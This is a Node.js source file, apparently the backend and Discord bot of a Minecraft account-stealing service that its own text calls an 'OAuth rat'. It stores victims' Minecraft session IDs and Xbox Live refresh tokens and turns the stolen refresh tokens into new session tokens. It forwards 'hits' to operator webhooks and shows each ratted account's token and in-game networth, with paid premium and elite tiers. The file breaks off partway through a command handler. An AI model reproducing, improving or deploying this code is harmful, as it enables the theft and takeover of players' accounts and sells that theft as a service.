const sqlite3 = require('sqlite3').verbose();
const express = require('express');
const bodyParser = require('body-parser');
const { Authflow, Titles } = require("prismarine-auth");
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
import ('node-fetch')
app.use(express.static(__dirname));
const requestIp = require('request-ip');
const ip = require('ip');
const { WebhookClient, Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { triplehook, clientid, token, premiumroleid, eliteroleid, genchannel, mainserverguildid } = require('./config.json');
const port = 80;

const db = new sqlite3.Database('./webhook.db', sqlite3.OPEN_READWRITE, (error) => {
  if (error) return console.error(error.message);

  console.log('connection successful');
});

// Create first database
async function createTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS webhooks (
        code VARCHAR(255) PRIMARY KEY NOT NULL,
        webhook VARCHAR(255) NOT NULL,
        guildid VARCHAR(255) NOT NULL
      );`,
      (err) => {
        if (err) {
          return reject(err);
        }
        return resolve();
      }
    );
  });
}

async function getWebhooks(code) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM webhooks WHERE code = $1`, code, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => row.webhook));
      } else {
        resolve([]);
      }
    });
  });
}

async function getGuildID(code) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM webhooks WHERE code = $1`, code, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => row.guildid));
      } else {
        resolve([]);
      }
    });
  });
}

async function setWebhook(code, webhook, guildid) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO webhooks (code, webhook, guildid) VALUES ($1, $2, $3);`,
      [code, webhook, guildid],
      (error) => {
        if (error) {
          console.error(error);
        }
        return resolve();
      }
    );
  });
}

async function getCodes(code) {
  return new Promise(function (resolve, reject) {
    db.get(`SELECT * FROM webhooks WHERE code = $1`, code, (error, row) => {
      if (error) {
        console.error(error);
        return reject(error);
      }

      // If a row is returned, the code is taken; otherwise, it's not taken
      const isTaken = !!row;
      return resolve(isTaken);
    });
  });
}

// Initiate first database
createTables()
  .then(() => {
    console.log('Tables created successfully.');
  })
  .catch((error) => {
    console.error('Error creating tables:', error);
  });

// Create second database
async function create2ndTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS servers (
        guildid VARCHAR(255) PRIMARY KEY NOT NULL,
        doublehook VARCHAR(255) NOT NULL
      );`,
      (err) => {
        if (err) {
          return reject(err);
        }
        return resolve();
      }
    );
  });
}

async function get2ndWebhooks(guildid) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM servers WHERE guildid = $1`, guildid, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => row.doublehook));
      } else {
        resolve([]);
      }
    });
  });
}

async function set2ndWebhook(guildid, doublehook) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO servers (guildid, doublehook) VALUES ($1, $2);`,
      [guildid, doublehook],
      (error) => {
        if (error) {
          console.error(error);
        }
        return resolve();
      }
    );
  });
}

// Initiate second database
create2ndTables()
  .then(() => {
    console.log('2nd tables created successfully.');
  })
  .catch((error) => {
    console.error('Error creating tables:', error);
  });

// Create third database
async function create3rdTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS ids (
        guildid VARCHAR(255) PRIMARY KEY NOT NULL,
        oauthid VARCHAR(255) NOT NULL
      );`,
      (err) => {
        if (err) {
          return reject(err);
        }
        return resolve();
      }
    );
  });
}

async function get3rdWebhooks(guildid) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM ids WHERE guildid = $1`, guildid, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => row.oauthid));
      } else {
        resolve([]);
      }
    });
  });
}

async function set3rdWebhook(guildid, oauthid) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO ids (guildid, oauthid) VALUES ($1, $2);`,
      [guildid, oauthid],
      (error) => {
        if (error) {
          console.error(error);
        }
        return resolve();
      }
    );
  });
}

// Initiate third database
create3rdTables()
  .then(() => {
    console.log('3rd tables created successfully.');
  })
  .catch((error) => {
    console.error('Error creating tables:', error);
  });

// Create fourth database
async function create4thTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS whitelisted (
        guildid VARCHAR(255) PRIMARY KEY NOT NULL
      );`,
      (err) => {
        if (err) {
          return reject(err)
        }
        return resolve();
      }
    )
  })
}

async function get4thGuilds(guildid) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM whitelisted WHERE guildid = $1`, guildid, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => row.guildid));
      } else {
        resolve([]);
      }
    });
  });
}

async function set4thGuilds(guildid) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO whitelisted (guildid) VALUES (?);`,
      [guildid],
      (error) => {
        if (error) {
          console.error(error);
        }
        return resolve();
      }
    );    
  });
}

// Initiate fourth database
create4thTables()
  .then(() => {
    console.log('4th tables created successfully.');
  })
  .catch((error) => {
    console.error('Error creating tables:', error);
  });

// Create fifth database
async function create5thTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS premium (
        userid VARCHAR(255) PRIMARY KEY NOT NULL
      );`,
      (err) => {
        if (err) {
          return reject(err)
        }
        return resolve();
      }
    )
  })
}

async function getBuyer(userid) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM premium WHERE userid = $1`, userid, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => row.userid));
      } else {
        resolve([]);
      }
    });
  });
}

async function setBuyer(userid) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO premium (userid) VALUES (?);`,
      [userid],
      (error) => {
        if (error) {
          console.error(error);
        }
        return resolve();
      }
    );    
  });
}

create5thTables()
  .then(() => {
    console.log('5th tables created successfully.');
  })
  .catch((error) => {
    console.error('Error creating tables:', error);
  });

// Create sixth database
async function create6thTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS minecraft_data (
        guildid VARCHAR(255) NOT NULL,
        minecraft_ign VARCHAR(255) NOT NULL,
        session_id VARCHAR(255) NOT NULL,
        xbl_refresh_token VARCHAR(255) NOT NULL,
        PRIMARY KEY (guildid, minecraft_ign)
      );`,
      (err) => {
        if (err) {
          return reject(err)
        }
        return resolve();
      }
    )
  })
}

async function getMinecraftData(guildid) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT minecraft_ign, session_id, xbl_refresh_token FROM minecraft_data WHERE guildid = $1`, guildid, (error, rows) => {
      if (error) {
        console.error(error);
        reject(error);
      }

      if (rows && rows.length > 0) {
        resolve(rows.map(row => ({ minecraft_ign: row.minecraft_ign, session_id: row.session_id, xbl_refresh_token: row.xbl_refresh_token })));
      } else {
        resolve([]);
      }
    });
  });
}

async function setMinecraftData(guildid, minecraft_ign, session_id, xbl_refresh_token) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO minecraft_data (guildid, minecraft_ign, session_id, xbl_refresh_token) VALUES (?, ?, ?, ?);`,
      [guildid, minecraft_ign, session_id, xbl_refresh_token],
      (error) => {
        if (error) {
        }
        return resolve();
      }
    );    
  });
}

// Initiate sixth database
create6thTables()
  .then(() => {
    console.log('6th tables created successfully.');
  })
  .catch((error) => {
    console.error('Error creating tables:', error);
  });

// Networth functions
async function getUsernameAndUUID(bearerToken) {
  try {
      const url = 'https://api.minecraftservices.com/minecraft/profile'
      const config = {
          headers: {
              'Authorization': 'Bearer ' + bearerToken,
          }
      }
      let response = await axios.get(url, config)
      if (response.status == 404) {res.send("Access denied because no Minecraft account was found.") 
      return ["timmy", "timmy"] }
      return [response.data['id'], response.data['name']]
  } catch (error) {
      return ["timmy", "timmy"]
      
  }
}

async function getPlayerData(username) {
  let url = `https://careful-flip-flops-pig.cyclic.app/v2/profiles/${username}`
  let config = {
      headers: {
          'Authorization': 'brrrkeytimmytm'
      }
  }

  try {
      let response = await axios.get(url, config)
      return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
  } catch (error) {
      return ["API DOWN", 0.0]
  }
}

async function getPlayerStatus(username) {
  try {
    let url = `https://careful-flip-flops-pig.cyclic.app/v2/status/${username}`
    let config = {
      headers: {
        'Authorization': 'brrrkeytimmytm'
      }
    }
    let response = await axios.get(url, config)
    return response.data.data.online
  } catch (error) {
    return "API DOWN"
  }
}

async function getPlayerDiscord(username) {
  try {
    let url = `https://careful-flip-flops-pig.cyclic.app/v2/discord/${username}`;
    let config = {
      headers: {
        Authorization: "brrrkeytimmytm"
      }
    };
    let response = await axios.get(url, config);
    if (response.data.data.socialMedia.links == null) {
      return response.data.data.socialMedia;
    } else {
      return response.data.data.socialMedia.links.DISCORD;
    }
  } catch (error) {
    return "API DOWN";
  }
}

async function getNetworth(username) {
  try {
    let url = `https://careful-flip-flops-pig.cyclic.app/v2/profiles/${username}`;
    let config = {
      headers: {
        Authorization: "brrrkeytimmytm"
      }
    };
    let response = await axios.get(url, config);
    return [
      response.data.data[0]["networth"],
      response.data.data[0].networth["noInventory"],
      response.data.data[0].networth["networth"],
      response.data.data[0].networth["unsoulboundNetworth"],
      response.data.data[0].networth["soulboundNetworth"]
    ];
  } catch (error) {
    return ["API DOWN", "API DOWN", "API DOWN", "API DOWN", "API DOWN",]
  }
}

const formatNumber = (num) => {
  if (num < 1000) return num.toFixed(2)
  else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
  else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
  else return `${(num / 1000000000).toFixed(2)}b`
}

async function refreshXBL(xbl) {
  const [refreshId, refreshUniqueId] = xbl.split('&');
  let xbltoken;
      const directoryPath = `./accs/${refreshId}/${refreshUniqueId}`;
      const targetFileNamePattern = 'xbl-cache';
      const files = fs.readdirSync(directoryPath);
      const matchingFiles = files.filter(file => file.includes(targetFileNamePattern));
      if (matchingFiles.length > 0) {
        try {
          const filePath = path.join(directoryPath, matchingFiles[0]);
          const fileContents = fs.readFileSync(filePath, 'utf8');
          const jsonData = JSON.parse(fileContents);
          xbltoken = extractXBLToken(jsonData);
          const xstsUserHash = await getxstsuserhash(xbltoken);
          const ssid = await getssid(xstsUserHash[0], xstsUserHash[1])
          return ssid;
      } catch (error) {
        return;
      }
  }
}

// Refresh stuff
app.use(bodyParser.json());
async function getxstsuserhash(xbl) {
  const url = 'https://xsts.auth.xboxlive.com/xsts/authorize';
  const headers = { 'Content-Type': 'application/json', 'Accept': 'application/json' };
  const data = {
    Properties: {
      SandboxId: 'RETAIL',
      UserTokens: [xbl],
    },
    RelyingParty: 'rp://api.minecraftservices.com/',
    TokenType: 'JWT',
  };

  try {
    const response = await axios.post(url, data, { headers });
    const jsonresponse = response.data;
    return [jsonresponse.DisplayClaims.xui[0].uhs, jsonresponse.Token];
  } catch (error) {
    throw new Error(error.message);
  }
}

async function getssid(userHash, xsts) {
  const url = 'https://api.minecraftservices.com/authentication/login_with_xbox';
  const headers = { 'Content-Type': 'application/json' };
  const identityToken = `XBL3.0 x=${userHash};${xsts}`;
  const data = {
    identityToken,
    ensureLegacyEnabled: 'true',
  };

  try {
    const response = await axios.post(url, data, { headers });
    const jsonresponse = response.data;
    return jsonresponse.access_token;
  } catch (error) {
    throw new Error(error.message);
  }
}

// Discord bot part
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);

  const commands = [
    {
      name: 'gen',
      description: 'Generate an OAuth rat ID',
    },
    {
      name: 'conf',
      description: 'Configure OAuth server settings',
    },
    {
      name: 'refresh',
      description: 'Provide a xbl token and this command will return a new token',
    },
    {
      name: 'setid',
      description: 'Setup OAuth ID',
    },
    {
      name: 'setup',
      description: 'Set OAuth embed up for server',
    },
    {
      name: 'embed',
      description: 'Setup product or info embed',
    },
    {
      name: 'panel',
      description: 'Setup product panel embed',
    },
    {
      name: 'hits',
      description: 'Check hits - premium only'
    },
    {
      name: 'claim',
      description: 'Claim a hit based on its IGN'
    }
  ];

  const rest = new REST({ version: '9' }).setToken(token);

  try {
    console.log('Started refreshing application (/) commands.');

    await rest.put(
      Routes.applicationCommands(clientid),
      { body: commands },
    );

    console.log('Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error(error);
  }
});

client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.commandName === 'gen') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
          .setCustomId('Webhook')
          .setTitle('Create an OAuth link');
      const titleInput = new TextInputBuilder()
          .setCustomId('webhookInput')
          .setLabel("webhook")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'Webhook') {
      try {
        await interaction.deferReply({ ephemeral: true });
        const webhookURL = interaction.fields.getTextInputValue('webhookInput');
        const userId = generateRandomString(8);
        const realUserId = interaction.user.id;

        if (!webhookURL.match(/https?:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api(?:\/)?(v\d{1,2})?\/webhooks\/\d{17,21}\/[\w\-]{68}/)) {
            await interaction.followUp({
                content: '❌ Invalid webhook', ephemeral: false
            });
            return;
        } 
      
        try {
          const existingEntry = await getCodes(userId);
        
          if (existingEntry) {
            await interaction.followUp({
              content: '❌ The ID is taken', ephemeral: true
            });
            return;
          }
          const guildid = interaction.guild.id;

          const preGuildId = await get4thGuilds(guildid)
          const finalGuildID = preGuildId[0]

          if (guildid === finalGuildID) {
            try {
              setWebhook(userId, webhookURL, guildid);
              console.log('Webhook URL & userId added to database');

              const discordReply = new EmbedBuilder()
                .setTitle('✅ OAuth rat ID successfully saved')
                .setDescription('ID was successfully saved, copy this ID and do /setid [ID] and then /embed\n' + '**ID:**' + '```' + userId + '```')
                .setColor(0x00FF00)
                .setFooter({ text: 'by @officialtimmy' });
            
              const invButton = new ButtonBuilder()
                .setLabel('BOT INV')
                .setStyle(ButtonStyle.Link)
                .setURL(`https://discord.com/api/oauth2/authorize?client_id=${clientid}&permissions=8&scope=applications.commands+bot`);
            
              const newActionRow = new ActionRowBuilder().addComponents(invButton);
            
              await interaction.followUp({
                embeds: [discordReply],
                components: [newActionRow],
                ephemeral: true
              });

              if (guildid === mainserverguildid) {
                const discordGenReply = new EmbedBuilder()
                  .setTitle('🎉 Free OAuth rat generated')
                  .setDescription(`Successfully generated a **free** OAuth link for <@${realUserId}>`)
                  .setTimestamp()
                  .setColor(0x00FF00)
                  .setFooter({ text: 'by @officialtimmy' });
          
                await interaction.guild.channels.cache.get(genchannel).send({ embeds: [discordGenReply] })
              }
            } catch (error) {
              console.log('Error generating OAuth link: ' + error)
            }
            return;
          } else {
            await interaction.followUp({
              content: '❌ Server is not whitelisted', 
              ephemeral: true
            })
          }
        } catch (error) {
        }
        } catch (error) {
        }
    } else if (interaction.commandName === 'setid') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
          .setCustomId('SetID')
          .setTitle('Setup OAuth ID');
      const titleInput = new TextInputBuilder()
          .setCustomId('idInput')
          .setLabel("id")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'SetID') {
      await interaction.deferReply({ ephemeral: true });
      try {
        const userId = interaction.fields.getTextInputValue('idInput');
        const guildid = interaction.guild.id;

        set3rdWebhook(guildid, userId)
        await interaction.followUp({
          content: 'Successfully set ID for server',
          ephemeral: true
        });
      } catch (error) {
      }
    } else if (interaction.commandName === 'conf') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
          .setCustomId('Configure')
          .setTitle('Configure server doublehook');
      const titleInput = new TextInputBuilder()
          .setCustomId('doublehookInput')
          .setLabel("webhook")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'Configure') {
      await interaction.deferReply({ ephemeral: true });
      const guildid = interaction.guild.id;
      const doublehook = interaction.fields.getTextInputValue('doublehookInput');
      // Check if the user has admin permissions
      if (!interaction.member.permissions.has([PermissionsBitField.Flags.KickMembers, PermissionsBitField.Flags.BanMembers])) {
          await interaction.followUp({
              content: '❌ You do not have the necessary permissions to use this command',
              ephemeral: false
          });
          return;
      }

      if (!doublehook.match(/https?:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api(?:\/)?(v\d{1,2})?\/webhooks\/\d{17,21}\/[\w\-]{68}/)) {
          await interaction.followUp({
              content: '❌ Invalid webhook',
              ephemeral: true
          });
          return;
      }

      const preGuildId = await get4thGuilds(guildid)
      const finalGuildID = preGuildId[0]

      if (guildid === finalGuildID) {
        try {
          set2ndWebhook(guildid, doublehook);
          console.log('Doublehook & GuildID added to database');
      
          const discordDoublehookReply = new EmbedBuilder()
              .setTitle('✅ OAuth Gen doublehook & GuildID added to database')
              .setDescription('The doublehook has successfully been configured. If someone generates an OAuth rat in your server, their hits will also be sent to you.')
              .setColor(0x00FF00)
              .setFooter({ text: 'by @officialtimmy' });

          await interaction.followUp({
              embeds: [discordDoublehookReply],
              ephemeral: true
          });
      } catch (error) {
          console.error('Error interacting with DB:', error);
      }
      } else {
        await interaction.followUp({
          content: '❌ Server is not whitelisted', 
          ephemeral: true
        })
      }
    } else if (interaction.commandName === 'refresh') {
        const modal = new ModalBuilder()
            .setCustomId('Refresh')
            .setTitle('Refresh a SSID/Token using XBL Refresh ID');
        const titleInput = new TextInputBuilder()
            .setCustomId('xblInput')
            .setLabel("XBL Refresh ID")
            .setStyle(TextInputStyle.Short);
        const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
        modal.addComponents(firstActionRow);
        await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'Refresh') {
      await interaction.deferReply({ ephemeral: true });
      const xbl = interaction.fields.getTextInputValue('xblInput');

      try {
        const ssid = await refreshXBL(xbl);
        const discordRefreshReply = new EmbedBuilder()
            .setTitle('✅ Token refreshed')
            .setDescription('```'+ ssid +'```')
            .setColor(0x00FF00)
            .setFooter({ text: 'by @officialtimmy' })
        await interaction.followUp({
            embeds: [discordRefreshReply],
            ephemeral: true
        });
      } catch (error) {
        await interaction.followUp({
          content: '❌ Invalid XBL Token/Token Expired/Ratelimit',
          ephemeral: true
      });
      }
    } else if (interaction.commandName === 'panel') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
        .setCustomId('myPanelModal')
        .setTitle('Create an panel');
    const titleInput = new TextInputBuilder()
        .setCustomId('titleInput')
        .setLabel("Title")
        .setStyle(TextInputStyle.Short);
    const messageInput = new TextInputBuilder()
        .setCustomId('messageInput')
        .setLabel("Message")
        .setStyle(TextInputStyle.Paragraph);
    const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
    const secondActionRow = new ActionRowBuilder().addComponents(messageInput);
    modal.addComponents(firstActionRow, secondActionRow);
    await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'myPanelModal') {
      await interaction.deferReply({ ephemeral: true });
      if (!interaction.member.permissions.has([PermissionsBitField.Flags.KickMembers, PermissionsBitField.Flags.BanMembers])) {
        await interaction.followUp({
            content: '❌ You do not have the necessary permissions to use this command',
            ephemeral: false
        });
        return;
      }
      try {
        const title = interaction.fields.getTextInputValue('titleInput');
        const desc = interaction.fields.getTextInputValue('messageInput');
        const embed = new EmbedBuilder()
            .setTitle(title)
            .setDescription(desc)
            .setColor('#0099ff')
            .setFooter({ text: 'by @officialtimmy' });
        const freeGenButton = new ButtonBuilder()
            .setLabel('Generate Link 🚀')
            .setStyle(ButtonStyle.Success)
            .setCustomId('GenFreeOAuth'); 
        const premiumGenButton = new ButtonBuilder()
            .setLabel('Premium 💎')
            .setStyle(ButtonStyle.Primary)
            .setCustomId('GenPremiumOAuth'); 
        const eliteGenButton = new ButtonBuilder()
            .setLabel('Elite ⭐')
            .setStyle(ButtonStyle.Danger)
            .setCustomId('GenEliteOAuth'); 
        const row = new ActionRowBuilder().addComponents(freeGenButton, premiumGenButton, eliteGenButton);
        await interaction.followUp({
            content: 'Embed created',
            ephemeral: true
        });
        await interaction.channel.send({
          embeds: [embed],
          components: [row]
      });
    } catch (error) {
    }
    } else if (interaction.customId === 'GenFreeOAuth') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
          .setCustomId('Webhook')
          .setTitle('Create an OAuth link');
      const titleInput = new TextInputBuilder()
          .setCustomId('webhookInput')
          .setLabel("webhook")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
    } else if (interaction.customId === 'GenPremiumOAuth') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
          .setCustomId('PremiumMCOauthGen')
          .setTitle('Get access to premium OAuth');
      const titleInput = new TextInputBuilder()
          .setCustomId('premiumGuildIDInput')
          .setLabel("guildid")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'PremiumMCOauthGen') {
        try {
          await interaction.deferReply({ ephemeral: true });
          const inputGuildID = interaction.fields.getTextInputValue('premiumGuildIDInput');
        
          try {
            const guildid = interaction.guild.id;
            const realUserId = interaction.user.id;

            const preGuildId = await get4thGuilds(guildid)
            const finalGuildID = preGuildId[0]

            const requiredRole = interaction.guild.roles.cache.find(role => role.id === premiumroleid);
            if (guildid === finalGuildID && interaction.member.roles.cache.has(requiredRole.id)) {
                try {
                  setBuyer(inputGuildID);
                  console.log('Successfully added GuildID to database');

                  const discordReply = new EmbedBuilder()
                    .setTitle('💎 Premium OAuth rat ID successfully saved')
                    .setDescription('ID was successfully saved, copy this ID and do /setid [ID] and then /embed\n' + '**ID:**' + '```' + inputGuildID + '```')
                    .setColor('#0099ff')
                    .setFooter({ text: 'by @officialtimmy' });
                
                  const invButton = new ButtonBuilder()
                    .setLabel('BOT INV')
                    .setStyle(ButtonStyle.Link)
                    .setURL(`https://discord.com/api/oauth2/authorize?client_id=${clientid}&permissions=8&scope=applications.commands+bot`);
                
                  const newActionRow = new ActionRowBuilder().addComponents(invButton);
                
                  await interaction.followUp({
                    embeds: [discordReply],
                    components: [newActionRow],
                    ephemeral: true
                  });

                  if (guildid === mainserverguildid) {
                    const discordGenReply = new EmbedBuilder()
                      .setTitle('💎 Premium OAuth rat generated')
                      .setDescription(`Successfully generated a **premium** OAuth link for <@${realUserId}>`)
                      .setTimestamp()
                      .setColor('#0099ff')
                      .setFooter({ text: 'by @officialtimmy' });
              
                    await interaction.guild.channels.cache.get(genchannel).send({ embeds: [discordGenReply] })
                  }
                } catch (error) {
                  console.log('Error generating OAuth link: ' + error)
                }
            } else {
              await interaction.followUp('❌ You don\'t have the requierd role https://tenor.com/view/you-didnt-say-the-magic-word-ah-ah-nope-wagging-finger-gif-17646607');
            }
          } catch (error) {
            console.error(error);
            await interaction.followUp('❌ You don\'t have the requierd role https://tenor.com/view/you-didnt-say-the-magic-word-ah-ah-nope-wagging-finger-gif-17646607');
          }
        } catch (error) {
          console.log(error);
        }
    } else if (interaction.commandName === 'hits') {
      await interaction.deferReply({ ephemeral: true });
      if (!interaction.member.permissions.has([PermissionsBitField.Flags.KickMembers, PermissionsBitField.Flags.BanMembers])) {
        await interaction.followUp({
            content: '❌ You do not have the necessary permissions to use this command',
            ephemeral: false
        });
        return;
      }

      const guildid = interaction.guild.id;
      const minecraftData = await getMinecraftData(guildid);

      if (minecraftData.length > 0) {
          let currentIndex = 0; // Initialize the current index

          const constructEmbed = async (index) => {
            const data = minecraftData[index];
            
            try {
              const refreshedssid = await refreshXBL(data.xbl_refresh_token);
              await setMinecraftData(guildid, data.minecraft_ign, refreshedssid, data.xbl_refresh_token);
              const networthArray = await getNetworth(data.minecraft_ign)
              const networth = networthArray[0]
              const networthNoInventory = networthArray[1]
              const networthNetworth = networthArray[2]
              const networthUnsoulbound = networthArray[3]
              const networthSoulbound = networthArray[4]
            
              let total_networth
              // Set it "API IS TURNED OFF IF NULL"
              if (networth == "API DOWN") total_networth = networth;
              else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
              else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
              else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
              return new EmbedBuilder()
                .setColor('#0099ff')
                .setTitle(`Account ${index + 1}`)
                .addFields(
                  { 
                    name: '**Username:**',
                    value: '```' + data.minecraft_ign + '```',
                    inline: true 
                  },
                  {
                    name: '**Networth:**',
                    value: '```' + total_networth + '```'
                  },
                  {
                    name: '**Token:**',
                    value: '```' + data.session_id + '```'
                  }
                )
                .setTimestamp()
                .setFooter({ text: 'by @officialtimmy' });
            } catch (error) {
            }
          };

          const buildActionRow = () => {
              const decreasePage = new ButtonBuilder()
                  .setLabel('Previous Page')
                  .setStyle(ButtonStyle.Danger)
                  .setCustomId('DecreasePage');

              const increasePage = new ButtonBuilder()
                  .setLabel('Next Page')
                  .setStyle(ButtonStyle.Success)
                  .setCustomId('IncreasePage');
              
              const searchIGN = new ButtonBuilder()
                  .setLabel('Search IGN 🔎')
                  .setStyle(ButtonStyle.Secondary)
                  .setCustomId('SearchModal');
              
              const searchPage = new ButtonBuilder()
                  .setLabel('Search Page 🔎')
                  .setStyle(ButtonStyle.Secondary)
                  .setCustomId('PageModal');

              const row = new ActionRowBuilder().addComponents(searchIGN, searchPage);

              if (currentIndex > 0) {
                  row.addComponents(decreasePage);
              }

              if (currentIndex < minecraftData.length - 1) {
                  row.addComponents(increasePage);
              }

              return row;
          };

          const sendEmbed = async () => {
              const embed = await constructEmbed(currentIndex);
              const row = buildActionRow();
            try {
              await interaction.editReply({
                embeds: [embed],
                components: [row],
                ephemeral: true
            });
            } catch (error) {
            }
          };

          await sendEmbed();

          client.on('interactionCreate', async (interaction) => {
            try {
              if (interaction.isButton()) {
                if (interaction.customId === 'IncreasePage') {
                    currentIndex = Math.min(currentIndex + 1, minecraftData.length - 1);
                } else if (interaction.customId === 'DecreasePage') {
                    currentIndex = Math.max(currentIndex - 1, 0);
                } else if (interaction.customId === 'PageModal') {
                    const modal = new ModalBuilder()
                        .setCustomId('PremiumMCOauthGenPage')
                        .setTitle('Search for specific page');
                    const titleInput = new TextInputBuilder()
                        .setCustomId('pageInput')
                        .setLabel("PAGE")
                        .setStyle(TextInputStyle.Short);
                    const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
                    modal.addComponents(firstActionRow);
                    await interaction.showModal(modal);
                } else if (interaction.customId === 'SearchModal') {
                    const modal = new ModalBuilder()
                        .setCustomId('PremiumMCOauthGenSearch')
                        .setTitle('Search database for a specific IGN');
                    const titleInput = new TextInputBuilder()
                        .setCustomId('usernameInput')
                        .setLabel("IGN")
                        .setStyle(TextInputStyle.Short);
                    const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
                    modal.addComponents(firstActionRow);
                    await interaction.showModal(modal);
                }
                await sendEmbed(); // Update the embed
                return await interaction.deferUpdate();
              } else if (interaction.isModalSubmit() && interaction.customId === 'PremiumMCOauthGenSearch') {
                  // Handle the submitted search query
                  const ign = interaction.fields.getTextInputValue('usernameInput')
                  const foundIndex = minecraftData.findIndex(data => data.minecraft_ign.toLowerCase() === ign.toLowerCase());
                  if (foundIndex !== -1) {
                      currentIndex = foundIndex;
                      await interaction.deferUpdate();
                      await sendEmbed(); // Update the embed with the found IGN
                  } else {
                      const error404 = new EmbedBuilder()
                        .setTitle('❌ Username not found')
                        .setDescription('An account with this username has not been saved in our database, if you\'ve recently changed the accounts username id reccomend trying the old one')
                        .setColor('#ff0000')
                        .setFooter({ text: 'by @officialtimmy' });

                      await interaction.deferUpdate()
                      await interaction.editReply({
                        embeds: [error404],
                        ephemeral: true
                      });
                  }
                } else if (interaction.isModalSubmit() && interaction.customId === 'PremiumMCOauthGenPage') {
                  try {
                      const page = parseInt(interaction.fields.getTextInputValue('pageInput'));
                      currentIndex = Math.max(0, Math.min(page - 1, minecraftData.length - 1));
                      await interaction.deferUpdate();
                      await sendEmbed(); // Update the embed with the found search
                  } catch (error) {
                  }
              }
            } catch (error) {
            }
        });
      } else {
        const error404 = new EmbedBuilder()
          .setTitle('❌ No Minecraft data found for this guild')
          .setDescription('Our database has no history of Minecraft accounts ratted in this guild')
          .setColor('#ff0000')
          .setFooter({ text: 'by @officialtimmy' });

        await interaction.followUp({
          embeds: [error404],
          ephemeral: true
        });
      }
    } else if (interaction.commandName === 'claim') {
